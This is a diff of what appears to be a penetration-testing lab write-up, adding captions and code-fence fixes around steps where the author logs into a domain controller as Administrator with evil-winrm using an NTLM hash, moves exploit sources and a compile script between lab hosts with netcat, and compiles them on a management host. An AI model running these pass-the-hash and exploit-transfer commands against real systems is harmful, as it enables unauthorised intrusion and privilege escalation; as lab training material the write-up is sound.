@@ -2988,7 +2988,7 @@ ssmallsadm@MGMT01:~$
 
 ```
 
-Dowloading the poc on kali:
+Dowloading the poc on kali andf Uploading the exploit files on the DC through evil winrm:
 
 ```bash
 evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
@@ -3059,6 +3059,8 @@ Data: 60360 bytes of 60360 bytes copied
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "nc64.exe 172.16.9.25 8000 < exploit-2.c"
 ```
 
+Sending all the files to the target host:
+
 ```
 ssmallsadm@MGMT01:~$ nc -lvnp 8000 > compile.sh
 Listening on 0.0.0.0 8000
@@ -3079,7 +3081,12 @@ compile.sh: Bourne-Again shell script, ASCII text executable
 ssmallsadm@MGMT01:~$ nc -lvnp 8000 > exploit-2.c
 Listening on 0.0.0.0 8000                                                                                       
 Connection received on 172.16.9.3 55427                                                                         
-^C                                                                                                              
+^C                                                                               
+
+```
+
+
+```                            
 ssmallsadm@MGMT01:~$ ls                                                                                         
 compile.sh  exploit-1.c  exploit-2.c  flag.txt                                                                  
 ssmallsadm@MGMT01:~$ bash compile.sh                                                                            
